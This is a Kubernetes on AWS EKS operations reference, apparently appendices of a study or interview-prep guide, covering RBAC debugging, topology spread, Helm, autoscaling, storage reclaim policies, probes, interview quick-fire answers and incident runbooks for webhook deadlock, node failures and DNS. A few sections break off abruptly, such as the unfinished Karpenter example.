3. LIST ALL PERMISSIONS FOR SUBJECT:
   kubectl auth can-i --list \
     --namespace=<ns> \
     --as=system:serviceaccount:<ns>:<sa-name>

4. FIND RELEVANT BINDINGS:
   kubectl get rolebindings -n <ns> \
     -o json | jq '.items[] | select(.subjects[]?.name == "<subject>")'

   kubectl get clusterrolebindings \
     -o json | jq '.items[] | select(.subjects[]?.name == "<subject>")'

5. COMMON MISTAKES:
   □ RoleBinding in wrong namespace
   □ Subject name typo (case-sensitive)
   □ ServiceAccount subject missing namespace field
   □ ClusterRoleBinding when RoleBinding intended (over-permission)
   □ API group mismatch (core "" vs "apps" vs "batch")
   □ Missing verb (can "get" but not "list")
   □ Resource name missing subresource (pods vs pods/log)

## A.7 Topology Spread — Production Patterns

### Multi-AZ Spread for High Availability

```yaml
# Spread API pods across AZs AND nodes
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  replicas: 6
  template:
    spec:
      topologySpreadConstraints:
      # Spread across AZs (hard constraint)
      - maxSkew: 1
        topologyKey: topology.kubernetes.io/zone
        whenUnsatisfiable: DoNotSchedule
        labelSelector:
          matchLabels:
            app: api
        # With 6 replicas and 3 AZs: 2-2-2

      # Spread across nodes within each AZ (soft constraint)
      - maxSkew: 1
        topologyKey: kubernetes.io/hostname
        whenUnsatisfiable: ScheduleAnyway
        labelSelector:
          matchLabels:
            app: api
        # Best effort: 1 pod per node if possible

      # Combined with anti-affinity for strict no-colocate
      affinity:
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
          - weight: 100
            podAffinityTerm:
              labelSelector:
                matchLabels:
                  app: api
              topologyKey: kubernetes.io/hostname
```

### When Topology Spread Fails

```
COMMON FAILURE: Pod stuck Pending with topology spread

kubectl describe pod → Events:
  "2 node(s) didn't match pod topology spread constraints"

CAUSES:
  1. Not enough nodes in each zone
     3 replicas, 2 AZs → maxSkew=1 requires min 1 in each AZ
     If one AZ has 0 nodes → cannot satisfy

  2. Not enough capacity in the required zone
     Zone us-east-1a has nodes but all are full

  3. Conflicting with other constraints
     nodeAffinity restricts to specific nodes
     Those nodes are all in same zone
     topologySpread cannot be satisfied

FIX:
  - Use whenUnsatisfiable: ScheduleAnyway for less critical services
  - Ensure node groups span all target AZs
  - Check that nodeAffinity and topologySpread are compatible
```

## A.8 Helm Values Management — Production Patterns

### Values File Hierarchy

```
HELM VALUES PRECEDENCE (last wins):
  1. chart/values.yaml          ← chart defaults (lowest priority)
  2. -f values-base.yaml        ← team/org defaults
  3. -f values-production.yaml  ← environment-specific
  4. --set image.tag=v2.1.0     ← CI/CD override (highest priority)
```

```yaml
# values-base.yaml — shared across environments
replicaCount: 2

---
# values-production.yaml — production overrides
replicaCount: 5

```

### CI/CD Pipeline Integration

```bash
# Production deployment pipeline
helm upgrade --install myapp ./charts/myapp \
  -f values-base.yaml \
  -f values-production.yaml \
  --set image.tag=${GIT_SHA} \
  --namespace production \
  --atomic \                     # auto-rollback on failure
  --timeout 10m \                # wait up to 10 min
  --wait                         # wait for all pods Ready
```

## A.9 Cluster Autoscaler vs Karpenter

### Comparison

```
═══════════════════════════════════════════════════════════════
CLUSTER AUTOSCALER vs KARPENTER (EKS)
═══════════════════════════════════════════════════════════════

CLUSTER AUTOSCALER (CA):
  How: scales existing ASG node groups
  Node types: pre-defined in ASG launch template
  Scaling: adds/removes from ASG
  Bin packing: limited (depends on scheduler)
  Scale-down: waits 10 min low-util, strict safety checks
  Startup time: 2-4 min (ASG → EC2 launch → kubelet register)
  Multi-AZ: --balance-similar-node-groups
  IAM: IRSA for CA pod + ASG permissions

KARPENTER:
  How: directly provisions EC2 instances (no ASG)
  Node types: dynamically chosen based on pod requirements
  Scaling: picks optimal instance type per pending pod
  Bin packing: native, aggressive consolidation
  Scale-down: continuous consolidation (replaces nodes proactively)
  Startup time: 1-2 min (direct EC2 API, faster than ASG)
  Multi-AZ: native, considers all AZs
  IAM: IRSA for Karpenter controller + EC2/pricing permissions

WHEN TO USE WHICH:
  CA:        simpler setup, existing ASG-based infrastructure
  Karpenter: cost optimization, mixed instance types, faster scaling
  Trend:     Karpenter increasingly preferred for new EKS clusters
```

### Karpenter NodePool Example

```yaml
apiVersion: karpenter.sh/v1beta1
kind: NodePool
metadata:
  name: default
spec:

## A.11 Volume Expansion — Step by Step

```bash
# ═══════════════════════════════════════════════════════════
# ONLINE PVC EXPANSION ON EKS (zero downtime)
# ═══════════════════════════════════════════════════════════

# 1. Verify StorageClass allows expansion
kubectl get storageclass gp3 -o jsonpath='{.allowVolumeExpansion}'
# true ✓

# 2. Expand PVC (while pod is running)
kubectl patch pvc mysql-data -n production \
  -p '{"spec":{"resources":{"requests":{"storage":"200Gi"}}}}'

# 3. Watch progress
kubectl get pvc mysql-data -n production -w
# STATUS  CAPACITY  CONDITIONS
# Bound   100Gi     Resizing                    ← AWS resizing EBS volume
# Bound   100Gi     FileSystemResizePending     ← EBS resized, filesystem pending
# Bound   200Gi     (none)                      ← filesystem expanded, complete

# 4. Verify inside pod
kubectl exec -it mysql-0 -n production -- df -h /var/lib/mysql
# 200G  45G  155G  23% /var/lib/mysql ✓

# WHAT HAPPENED INTERNALLY:
# a) external-resizer called CSI: ControllerExpandVolume
# b) AWS API: ec2.ModifyVolume (gp3, 200Gi) — took ~30-60s
# c) Kubelet called CSI: NodeExpandVolume
# d) resize2fs expanded ext4 filesystem IN PLACE
# e) Zero downtime — pod continued running throughout

# ⚠️ Cannot SHRINK a PVC — only expansion supported
# ⚠️ Must wait 6 hours between EBS volume modifications (AWS limit)

## A.12 Secret Rotation Complete Flow

```
═══════════════════════════════════════════════════════════════
SECRET ROTATION — FULL PRODUCTION PIPELINE
═══════════════════════════════════════════════════════════════

PIPELINE: AWS SM → ESO → K8s Secret → Reloader → Pod Restart

1. AWS Secrets Manager rotates password (Lambda rotation function)
   Old password: still valid for dual-write period

2. External Secrets Operator detects change (refreshInterval: 1h)
   Syncs new password to K8s Secret

3. Reloader detects K8s Secret change
   Annotation on Deployment: secret.reloader.stakater.com/reload: "db-credentials"
   Triggers rolling restart of annotated Deployments

4. New pods start with new password
   Old pods gracefully terminated with old password

5. After all pods updated: disable old password in AWS SM

TIMING:
  AWS rotation:          immediate
  ESO sync:              up to refreshInterval (1h default, reduce for faster rotation)
  Reloader detection:    ~15 seconds after Secret update
  Rolling restart:       depends on pod count and maxSurge/maxUnavailable
  Total:                 refreshInterval + rolling restart time

FOR VOLUME-MOUNTED SECRETS (no restart needed):
  K8s Secret update → kubelet syncs to pod's tmpfs (~60s)
  App must re-read the file (inotify watcher or periodic check)
  Zero downtime if app handles file-watching
```

# APPENDIX B: INTERVIEW QUICK-FIRE ANSWERS

---

## B.1 Architecture Quick-Fire

**Q: What are the control plane components?**
> API server (front door, stateless), etcd (state store, Raft consensus), scheduler (pod placement), controller manager (reconciliation loops), cloud-controller-manager (cloud API integration). On EKS, all managed by AWS.

**Q: What is the most important architectural rule?**
> Only the API server talks to etcd. All other components communicate through the API server, centralizing auth, authz, and admission control.

**Q: What happens if the control plane goes down?**
> Running workloads continue — kubelet keeps containers alive. But nothing new can be scheduled, no scaling, no updates. The cluster is operationally frozen.

**Q: How does the scheduler decide where to place a pod?**
> Two phases: Filtering (eliminate nodes that can't run the pod — resources, taints, affinity) then Scoring (rank remaining nodes — LeastAllocated, ImageLocality, TopologySpread). Highest score wins.

**Q: What is the informer pattern?**
> Controllers use informers to efficiently watch resources. An informer does an initial LIST, then opens a long-lived WATCH stream for changes. It maintains a local cache that controllers read from instead of hitting the API server. Changes push object keys to a deduplicated work queue for the reconciler.

**Q: How does Raft prevent split brain?**
> Quorum requirement — a majority of nodes must agree on writes. A minority partition cannot commit writes because it can't get majority votes. Only one partition makes progress.

---

## B.2 Workloads Quick-Fire

**Q: Deployment vs StatefulSet — when to use which?**
> Deployment for stateless apps (web servers, APIs). StatefulSet for stateful apps needing stable names, dedicated storage, and ordered operations (databases, message queues). Deployment pods are interchangeable; StatefulSet pods have identity.

**Q: What is the difference between maxSurge and maxUnavailable?**
> maxSurge: how many extra pods above desired count during rollout. maxUnavailable: how many pods below desired count. For zero-downtime: maxSurge=1, maxUnavailable=0.

**Q: How do you do a canary deployment?**
> Native K8s: maxSurge=1, maxUnavailable=0, then `kubectl rollout pause` after first new pod. Validate, then resume. Better: use Argo Rollouts or Flagger for automated canary with metric analysis.

**Q: What's the difference between liveness and readiness probes?**
> Liveness: is the container alive? Failure → restart. Readiness: is it ready for traffic? Failure → removed from endpoints (no restart). Startup: has the app finished initializing? Protects slow-starting apps from premature liveness kills.

**Q: What's a PDB and why is it important?**
> PodDisruptionBudget limits voluntary disruptions. Without it, kubectl drain can evict all pods simultaneously causing outage. With PDB (minAvailable: 2), drain waits until replacements are ready.

**Q: HPA says "unknown" for CPU metric — why?**
> Pod doesn't have CPU requests set. HPA calculates utilization as percentage of request. No request → can't calculate → "unknown". Always set requests for HPA targets.

**Q: Why do init containers exist?**
> To externalize prerequisites from app code. Wait for dependencies (DB ready), run migrations, fetch configs, fix permissions — all using different images with specialized tools, before the app starts.

**Q: What problem do native sidecars solve?**
> Three issues: startup ordering (sidecar not ready when app starts), termination ordering (sidecar dies before app finishes draining), and Job completion (Istio sidecar never exits → Job never completes).

---

## B.3 Networking Quick-Fire

**Q: How does DNS work in Kubernetes?**
> CoreDNS runs as pods in kube-system. Every pod's /etc/resolv.conf points to CoreDNS ClusterIP. Service names resolve via search domains: `api-service` → `api-service.namespace.svc.cluster.local`. ndots:5 means short names get search domain expansion before FQDN lookup.

**Q: What is a headless service?**
> `clusterIP: None`. DNS returns ALL pod IPs instead of one virtual IP. No kube-proxy rules. Used for StatefulSets (stable per-pod DNS) and peer discovery in distributed systems.

**Q: How does the ALB Ingress Controller work on EKS?**
> AWS Load Balancer Controller watches Ingress resources, provisions ALBs, configures target groups. With `target-type: ip`, ALB sends traffic directly to pod IPs (VPC CNI). Supports path-based routing, TLS termination via ACM, and shared ALBs via group.name.

**Q: What are Network Policies?**
> Kubernetes-native L3/L4 firewalls. By default, all traffic is allowed. Once a policy selects a pod, that pod's default changes to deny for the policy's direction. Only explicitly allowed traffic passes. Requires a CNI that supports them (Calico, Cilium — not Flannel).

**Q: iptables vs IPVS — when to switch?**
> iptables: O(n) rule lookup, fine for small clusters. IPVS: O(1) hash lookup, use for 1000+ services. Cilium eBPF: best performance, replaces kube-proxy entirely.

---

## B.4 Storage Quick-Fire

**Q: What is the difference between PV and PVC?**
> PV is the actual storage resource (cluster-scoped). PVC is a user's request for storage (namespace-scoped). PVC binds to a matching PV. With dynamic provisioning via StorageClass, PVs are created automatically.

**Q: What is WaitForFirstConsumer and why is it important?**
> volumeBindingMode on StorageClass. Delays PV creation until a pod using the PVC is scheduled. Ensures EBS volume is created in the same AZ as the node. Without it, PV might be in a different AZ → pod can't schedule.

**Q: Can you shrink a PVC?**
> No. Only expansion is supported. Attempting to decrease storage request is rejected by the API server.

---

## B.5 Security Quick-Fire

**Q: How does IRSA work?**
> EKS has an OIDC provider. IAM role trust policy allows specific K8s ServiceAccount to assume it. Pod's SA is annotated with role ARN. Mutating webhook injects token file path. AWS SDK exchanges projected SA token for temporary credentials via STS. No static keys.

**Q: What happens if a validating webhook is down?**
> If failurePolicy: Fail → all matching API requests are rejected. Can deadlock the cluster if webhook pod can't be recreated (circular dependency). Fix: patch failurePolicy to Ignore temporarily.

**Q: What are the three Pod Security Standards levels?**
> Privileged (no restrictions), Baseline (prevents known escalations), Restricted (hardened: no root, no privilege escalation, read-only rootfs). Applied via namespace labels.

**Q: What is the principle of least privilege in K8s?**
> Start with no permissions, grant only what's needed. Use namespaced RoleBindings (not ClusterRoleBindings). Limit verbs to required actions. Don't use cluster-admin for applications. Disable automountServiceAccountToken when K8s API access isn't needed.

---

## B.6 Debugging Quick-Fire

**Q: Pod stuck in Pending — how do you debug?**
> `kubectl describe pod → Events`. Look for FailedScheduling. Common causes: insufficient resources, taint without toleration, node affinity mismatch, PVC AZ conflict. Fix depends on cause.

**Q: Exit code 137 — what does it mean?**
> OOMKilled. 128 + 9 (SIGKILL). Container exceeded memory limit. Check `kubectl describe pod` for `OOMKilled` reason. Fix: increase memory limit or fix memory leak.

**Q: Service returns "connection refused" — how do you debug?**
> Check `kubectl get endpoints <svc>`. If endpoints empty: selector mismatch or no Ready pods. If endpoints exist: check target port, try curl from debug pod. Check kube-proxy health.

**Q: How do you do a safe node drain?**
> `kubectl cordon node` (prevent new scheduling), then `kubectl drain node --ignore-daemonsets --delete-emptydir-data`. Drain respects PDBs — waits for pod replacements. Never use --force in production unless absolutely necessary.

**Q: CrashLoopBackOff — systematic debug approach?**
> 1. `kubectl logs --previous` (see crash output). 2. Check exit code: 137=OOM, 1=app error, 139=segfault. 3. For OOM: increase memory limit. 4. For app error: check env vars, config, secrets. 5. For missing dependency: check init container logs.

---

## B.7 Operations Quick-Fire

**Q: How do you upgrade an EKS cluster?**
> Three phases: 1) Upgrade control plane (AWS managed, 20-40 min). 2) Upgrade worker nodes (managed node group update or new node group + drain). 3) Update add-ons (CoreDNS, kube-proxy, VPC CNI, EBS CSI). Always one minor version at a time. Control plane first, then workers.

**Q: What is Helm and why is it useful?**
> Package manager for Kubernetes. Charts are packages of templated YAML. Provides versioned releases, rollbacks, values-based customization, hooks for lifecycle events (pre-upgrade migrations). --atomic flag auto-rolls back failed upgrades.

**Q: How does the Cluster Autoscaler work?**
> Every 10 seconds: scan for Pending pods. If pods can't schedule due to insufficient resources, CA calls AWS ASG API to increase desired count. For scale-down: identify underutilized nodes (< 50% used for 10 min), verify all pods can fit elsewhere, drain and terminate. Safety checks prevent evicting pods that violate PDBs or have local storage.

## C.1 Storage Deep Dive — Reclaim Policies, Volume Lifecycle, EBS on EKS

### PV Lifecycle States

```
═══════════════════════════════════════════════════════════════
PERSISTENTVOLUME LIFECYCLE STATES
═══════════════════════════════════════════════════════════════

Available → Bound → Released → (Available again or Deleted)

Available:
  PV exists, no PVC is bound to it.
  Ready for binding.

Bound:
  PV is bound to a PVC.
  One-to-one relationship.
  Volume is in use (or reserved for use).

Released:
  PVC was deleted, but PV still exists.
  Data is intact on the underlying storage.
  PV cannot auto-rebind — old claimRef blocks new binding.
  Admin must clear claimRef manually to make it Available again.

Failed:
  Automatic reclamation failed.
  Manual intervention required.
```

### Reclaim Policies — Critical for Production

```
═══════════════════════════════════════════════════════════════
RECLAIM POLICY — WHAT HAPPENS WHEN PVC IS DELETED
═══════════════════════════════════════════════════════════════

RETAIN:
  PV: moves to Released state. Data preserved.
  Cloud disk: EBS volume NOT deleted. Still exists in AWS.
  Action needed: admin manually deletes PV and/or EBS volume.
  Use for: production databases. ALWAYS.

DELETE (default for dynamic provisioning!):
  PV: automatically deleted.
  Cloud disk: EBS volume automatically deleted. DATA GONE.
  ⚠️ This is the DEFAULT when you use a StorageClass
     without explicit reclaimPolicy!
  Use for: dev/test environments ONLY.

RECYCLE (DEPRECATED — removed):
  Was: rm -rf /volume/*
  Replaced by dynamic provisioning.
  DO NOT use.
```

```yaml
# PRODUCTION StorageClass with Retain
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: gp3-retain
provisioner: ebs.csi.aws.com
parameters:
  type: gp3
  encrypted: "true"
  kmsKeyId: arn:aws:kms:us-east-1:123456789012:key/abc-123
reclaimPolicy: Retain              # ← CRITICAL for production
volumeBindingMode: WaitForFirstConsumer
allowVolumeExpansion: true

---
# DEV StorageClass with Delete (acceptable for ephemeral data)
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: gp3-dev
provisioner: ebs.csi.aws.com
parameters:
  type: gp3
reclaimPolicy: Delete
volumeBindingMode: WaitForFirstConsumer
allowVolumeExpansion: true
```

```bash
# Change reclaim policy on an existing PV (safe, live PV)
kubectl patch pv pv-prod-001 \
  -p '{"spec":{"persistentVolumeReclaimPolicy":"Retain"}}'

# View current reclaim policies for all PVs
kubectl get pv -o custom-columns=\
  NAME:.metadata.name,\
  RECLAIM:.spec.persistentVolumeReclaimPolicy,\
  STATUS:.status.phase,\
  CLAIM:.spec.claimRef.name

# Release a Retained PV for reuse (clear the old claim reference)
kubectl patch pv pv-prod-001 \
  --type='json' \
  -p='[{"op":"remove","path":"/spec/claimRef"}]'
# PV status: Released → Available
```

### EBS Volume Types for Kubernetes

```
═══════════════════════════════════════════════════════════════
AWS EBS VOLUME TYPES FOR KUBERNETES
═══════════════════════════════════════════════════════════════

gp3 (General Purpose SSD) — DEFAULT RECOMMENDATION:
  IOPS: 3,000 baseline (up to 16,000 provisioned)
  Throughput: 125 MB/s baseline (up to 1,000 MB/s)
  Cost: cheapest SSD option, decoupled IOPS pricing
  Use for: most workloads, databases, general storage

gp2 (older General Purpose SSD):
  IOPS: 3 per GB (burst to 3,000 for small volumes)
  No separate IOPS provisioning
  Being replaced by gp3 (which is cheaper and faster)

io2 (Provisioned IOPS SSD):
  IOPS: up to 64,000 provisioned
  Throughput: up to 1,000 MB/s
  99.999% durability (vs 99.8-99.9% for gp3)
  Use for: mission-critical databases, latency-sensitive workloads
  Cost: significantly more expensive than gp3

st1 (Throughput Optimized HDD):
  Throughput: up to 500 MB/s
  Low IOPS (500 baseline)
  Use for: big data, data warehouses, log processing
  Cannot be a boot volume

sc1 (Cold HDD):
  Cheapest storage option
  Use for: infrequently accessed data, archives
```

```yaml
# io2 StorageClass for mission-critical databases
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: io2-critical
provisioner: ebs.csi.aws.com
parameters:
  type: io2
  iopsPerGB: "50"     # 50 IOPS per GB (e.g., 100Gi = 5,000 IOPS)
  encrypted: "true"
reclaimPolicy: Retain
volumeBindingMode: WaitForFirstConsumer
```

### EBS AZ Affinity — The Most Common Storage Failure

```
═══════════════════════════════════════════════════════════════
AZ MISMATCH — #1 STORAGE FAILURE ON EKS
═══════════════════════════════════════════════════════════════

PROBLEM:
  EBS volumes are AZ-bound. An EBS volume in us-east-1a
  CANNOT be attached to a node in us-east-1b.

SCENARIO (without WaitForFirstConsumer):
  1. PVC created → PV dynamically provisioned in us-east-1a
  2. Pod scheduled to node in us-east-1b (by scheduler's scoring)
  3. Volume attachment fails
  4. Pod stuck in Pending: "volume node affinity conflict"

FIX: volumeBindingMode: WaitForFirstConsumer
  1. PVC created → NO PV created yet
  2. Pod scheduled to node in us-east-1c
  3. Now PV is created in us-east-1c (same AZ as node)
  4. Volume attachment succeeds ✓

DEBUGGING AZ MISMATCH:
  kubectl describe pod <n>
  # Warning  FailedScheduling  0/3 nodes available:
  #   1 node(s) had volume node affinity conflict

  kubectl get pv <pv-name> -o yaml | grep -A 5 nodeAffinity
  # Shows which AZ the PV is bound to

  kubectl get nodes -L topology.kubernetes.io/zone
  # Shows which AZ each node is in

RESCUE (if PV already provisioned in wrong AZ):
  Option 1: Delete PVC, recreate (data loss!)
  Option 2: Create EBS snapshot → restore in correct AZ
  Option 3: Add node in the PV's AZ
```

### EFS for ReadWriteMany (RWX)

```yaml
# EFS StorageClass — for shared filesystem across pods
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: efs-sc
provisioner: efs.csi.aws.com
parameters:
  provisioningMode: efs-ap         # EFS Access Points
  fileSystemId: fs-0123456789abcdef
  directoryPerms: "700"
  basePath: "/dynamic_provisioning"

---
# PVC using EFS (RWX — many pods can mount simultaneously)
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: shared-data
spec:
  accessModes:
  - ReadWriteMany          # multiple pods across nodes
  storageClassName: efs-sc
  resources:
    requests:
      storage: 5Gi          # EFS is elastic — this is metadata only

# USE CASES FOR EFS:
#   Shared config files across pods
#   ML model files accessed by many inference pods
#   CMS media uploads shared across web servers
#   Shared build caches for CI/CD

# EFS vs EBS:
#   EBS: block storage, single-node (RWO), lowest latency, fixed size
#   EFS: NFS, multi-node (RWX), higher latency, elastic sizing, more expensive
```

## C.2 Probes Deep Dive — Production Patterns and Anti-Patterns

### Probe Configuration Matrix

```
═══════════════════════════════════════════════════════════════
PROBE CONFIGURATION GUIDE
═══════════════════════════════════════════════════════════════

PARAMETER          LIVENESS           READINESS          STARTUP
─────────────────────────────────────────────────────────────────
Purpose            Is it alive?       Ready for traffic?  Done starting?
Failure action     KILL + restart     Remove from svc    KILL + restart
initialDelay       15-30s             5-10s              0s
periodSeconds      10-15s             5-10s              5-10s
timeoutSeconds     3-5s               3-5s               3-5s
failureThreshold   3                  3                  30 (long startup)
successThreshold   1                  1-2                1

TOTAL STARTUP BUDGET:
  startupProbe: periodSeconds × failureThreshold
  Example: 5s × 30 = 150 seconds max startup time
  After startup passes → liveness + readiness activate
```

### Liveness Probe — What to Check and What NOT to Check

```
═══════════════════════════════════════════════════════════════
LIVENESS PROBE ANTI-PATTERNS
═══════════════════════════════════════════════════════════════

✅ CORRECT liveness checks:
  • Is the HTTP server responding? (simple /healthz endpoint)
  • Is the process alive and not deadlocked?
  • Can the app handle a trivial request?

❌ WRONG liveness checks (common mistakes):
  • Checking database connectivity
    → DB down → liveness fails → pod restarts → DB still down
    → ALL pods restart in a loop → cascade failure
    → FIX: check DB in READINESS, not liveness

  • Checking external API availability
    → API rate-limited → liveness fails → restart storm
    → FIX: check external deps in readiness only

  • Complex health check that takes > timeout
    → Health endpoint queries DB + Redis + S3
    → Takes 8 seconds, timeout is 5 → always fails
    → FIX: liveness must be fast and local

  • Same endpoint for liveness and readiness
    → Semantics are different! Liveness = alive, readiness = ready for traffic
    → FIX: separate /healthz (liveness) and /ready (readiness)
```

### Production Probe Examples

```yaml
# ── Web Application (Node.js/Python/Go) ────────────────────
containers:
- name: api
  livenessProbe:
    httpGet:
      path: /healthz         # simple "am I alive" — NO external deps
      port: 8080
    initialDelaySeconds: 15
    periodSeconds: 10
    timeoutSeconds: 3
    failureThreshold: 3

  readinessProbe:
    httpGet:
      path: /ready            # checks DB connection, cache, dependencies
      port: 8080
    initialDelaySeconds: 5
    periodSeconds: 5
    timeoutSeconds: 5
    failureThreshold: 3

  startupProbe:
    httpGet:
      path: /healthz
      port: 8080
    periodSeconds: 5
    failureThreshold: 30       # 150s max startup

# ── Database (MySQL/PostgreSQL) ─────────────────────────────
containers:
- name: mysql
  livenessProbe:
    exec:
      command: ["mysqladmin", "ping", "-h", "127.0.0.1"]
    initialDelaySeconds: 30
    periodSeconds: 10
    timeoutSeconds: 5
    failureThreshold: 5        # more tolerance for DB

  readinessProbe:
    exec:
      command: ["mysql", "-h", "127.0.0.1", "-e", "SELECT 1"]
    initialDelaySeconds: 10
    periodSeconds: 5
    failureThreshold: 3

# ── gRPC Service ────────────────────────────────────────────
containers:
- name: grpc-service
  livenessProbe:
    grpc:
      port: 50051
      service: ""              # empty = check server health overall
    initialDelaySeconds: 10
    periodSeconds: 10

  readinessProbe:
    grpc:
      port: 50051
      service: "my.service.v1.Health"  # specific service readiness
    periodSeconds: 5

# ── Worker (no HTTP server — background job processor) ──────
containers:
- name: worker
  livenessProbe:
    exec:
      command:
      - cat
      - /tmp/healthy           # worker writes this file periodically
    initialDelaySeconds: 30
    periodSeconds: 15
    failureThreshold: 3
  # Worker writes /tmp/healthy every 10s in its main loop
  # If the loop hangs → file gets stale → cat fails → restart
  
  # No readiness probe needed — worker doesn't receive Service traffic
```

### Probe Failure Scenarios and Impact

```
═══════════════════════════════════════════════════════════════
SCENARIO ANALYSIS
═══════════════════════════════════════════════════════════════

Scenario 1: Liveness fails, readiness passes
  Container killed and restarted.
  During restart: pod temporarily removed from endpoints.
  After restart: readiness must pass again before traffic resumes.
  Impact: brief traffic disruption to this pod.

Scenario 2: Readiness fails, liveness passes
  Container stays running but removed from Service endpoints.
  No traffic routed to this pod.
  Other pods handle all traffic (increased load).
  Pod recovers when readiness passes again.
  Impact: reduced capacity but no restarts.

Scenario 3: Startup probe keeps failing
  Container killed after failureThreshold × periodSeconds.
  Pod enters CrashLoopBackOff.
  Liveness and readiness never activate.
  Impact: pod never becomes available.

Scenario 4: All pods fail readiness simultaneously
  All pods removed from Service endpoints.
  Service has 0 endpoints → connection refused for all traffic.
  ⚠️ This is a total service outage!
  Common cause: shared dependency (DB, config service) goes down
  and readiness probe checks that dependency.
  FIX: readiness should degrade gracefully, not fail completely
  when non-critical dependencies are down.

## C.3 Debugging Runbooks — Production Scenarios

### Runbook: Webhook Outage Causing Cluster Deadlock

```bash
# ═══════════════════════════════════════════════════════════
# RUNBOOK: ALL POD CREATES FAIL — WEBHOOK DEADLOCK
# ═══════════════════════════════════════════════════════════

# SYMPTOM: kubectl run test --image=nginx → hangs or returns error
# Error: "failed calling webhook" or timeout

# STEP 1: Confirm webhook is the blocker
kubectl run test --image=nginx --restart=Never 2>&1
# "Internal error occurred: failed calling webhook validate.policy.com:
#  Post https://webhook-svc.policy.svc:443/validate: dial tcp
#  10.96.50.100:443: connect: connection refused"

# STEP 2: Check webhook pods
kubectl get pods -n policy-system
# NAME                     READY   STATUS    RESTARTS
# policy-webhook-xyz       0/1     Pending   0          ← CAN'T SCHEDULE!
# Why? Because creating a pod requires... the webhook that's down.
# CIRCULAR DEPENDENCY → DEADLOCK

# STEP 3: Immediate fix — change failurePolicy to Ignore
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# For validating webhook:
kubectl patch validatingwebhookconfiguration policy-validation \
  --type='json' \
  -p='[{"op":"replace","path":"/webhooks/0/failurePolicy","value":"Ignore"}]'

# For mutating webhook:
kubectl patch mutatingwebhookconfiguration policy-mutation \
  --type='json' \
  -p='[{"op":"replace","path":"/webhooks/0/failurePolicy","value":"Ignore"}]'

# STEP 4: Now the webhook pod can schedule
kubectl get pods -n policy-system -w
# Wait for webhook pods to become Running+Ready

# STEP 5: Verify webhook is working
kubectl run test --image=nginx --restart=Never
kubectl delete pod test

# STEP 6: Restore failurePolicy to Fail
kubectl patch validatingwebhookconfiguration policy-validation \
  --type='json' \
  -p='[{"op":"replace","path":"/webhooks/0/failurePolicy","value":"Fail"}]'

# PREVENTION:
# 1. Use namespaceSelector to exclude webhook's own namespace from validation
# 2. Set appropriate failurePolicy based on criticality
# 3. Monitor webhook pod health with PDB (minAvailable: 1)
# 4. Set webhook timeout < 10s (default 30s causes API slowdown)
```

### Runbook: Node NotReady Cascading Failure

```bash
# ═══════════════════════════════════════════════════════════
# RUNBOOK: MULTIPLE NODES NotReady, PODS EVICTING
# ═══════════════════════════════════════════════════════════

# STEP 1: Assess scope
kubectl get nodes
# NAME       STATUS     ROLES
# worker-1   Ready      <none>    ← OK
# worker-2   NotReady   <none>    ← DOWN
# worker-3   NotReady   <none>    ← DOWN
# worker-4   Ready      <none>    ← OK
# 50% capacity loss

# STEP 2: Check pod impact
kubectl get pods -A --field-selector=spec.nodeName=worker-2 | grep -v Running
# Pods stuck Terminating — kubelet can't confirm deletion
# They auto-delete after 300s (5 min) of NotReady

# STEP 3: Are replacements scheduling?
kubectl get pods -A | grep Pending
kubectl describe pod <pending-pod> | grep -A 5 Events
# FailedScheduling: Insufficient cpu on remaining nodes

# STEP 4: Check Cluster Autoscaler
kubectl logs -n kube-system deployment/cluster-autoscaler | tail -20
# "Scale up triggered, adding 2 nodes" → good, nodes launching
# OR "cannot scale up: max size reached" → increase ASG max

# STEP 5: Immediate relief — free capacity
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.priorityClassName == "low-priority") |
      .metadata.namespace + "/" + .metadata.name'
# Evict low-priority pods to make room

kubectl scale deployment -n development --all --replicas=0

# STEP 6: Investigate root cause
# Check AWS EC2 status
aws ec2 describe-instance-status \
  --filters "Name=tag:kubernetes.io/cluster/my-cluster,Values=owned"

# Spot interruptions?
aws ec2 describe-spot-instance-requests \
  --filters "Name=state,Values=cancelled"

# Instance health check failures?
# SSH to node (if accessible): journalctl -u kubelet --since "10 min ago"

# STEP 7: Verify recovery
kubectl get nodes        # all Ready
kubectl get pods -A | grep -v -E "Running|Completed"  # should be empty

# POST-INCIDENT:
# - If spot interruptions: add on-demand baseline capacity
# - If OOM: right-size node instance types
# - If network partition: check VPC/subnet configuration
# - Review PDBs: were critical services protected during the event?
```

### Runbook: DNS Resolution Failing

```bash
# ═══════════════════════════════════════════════════════════
# RUNBOOK: DNS RESOLUTION FAILING
# ═══════════════════════════════════════════════════════════

# SYMPTOM: Service-to-service calls failing with connection errors
# Applications report: "could not resolve hostname"

# STEP 1: Test DNS from a debug pod
kubectl run dnstest --image=nicolaka/netshoot --rm -it --restart=Never -- bash

# Inside the debug pod:
nslookup kubernetes.default.svc.cluster.local
# If SERVFAIL → CoreDNS is down or overloaded
# If NXDOMAIN → service doesn't exist
# If timeout → network issue or network policy blocking port 53

# STEP 2: Check CoreDNS health
kubectl get pods -n kube-system -l k8s-app=kube-dns
# Are pods Running? Ready?
# If not Running: check events, resource limits

kubectl top pods -n kube-system -l k8s-app=kube-dns
# CPU or memory maxed out? → CoreDNS is overloaded

kubectl logs -n kube-system -l k8s-app=kube-dns --tail=50
# Look for: REFUSED, SERVFAIL, timeout errors

# STEP 3: Check resolv.conf in failing pods
kubectl exec -it <failing-pod> -- cat /etc/resolv.conf
# nameserver should point to CoreDNS ClusterIP (typically 10.96.0.10)
# search domains should include svc.cluster.local

# STEP 4: Test external DNS resolution
kubectl exec -it <failing-pod> -- nslookup google.com
# If internal DNS works but external fails:
#   CoreDNS upstream forwarder is broken
#   VPC DNS resolver issue
#   Network egress issue

# STEP 5: Check for Network Policies blocking DNS
kubectl get networkpolicies -n <namespace>
# If default-deny egress exists WITHOUT port 53 allowance:
#   DNS queries from pods in this namespace are blocked!
#   FIX: add egress rule allowing UDP/TCP port 53 to kube-dns pods

# STEP 6: Scale CoreDNS if overloaded
kubectl scale deployment coredns -n kube-system --replicas=4
